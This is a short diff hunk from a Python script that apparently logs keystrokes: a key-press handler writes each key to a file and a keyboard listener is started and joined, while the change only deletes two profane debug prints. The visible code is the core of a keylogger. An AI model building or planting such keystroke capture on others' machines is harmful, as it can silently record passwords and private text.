@@ -20,9 +20,7 @@ def on_press(key):
         file.write(k)
 
 def listen_keyboard():
-    print("shit")
     listener = keyboard.Listener(on_press=on_press)
-    print("shit2")
     listener.start()
     listener.join()
 
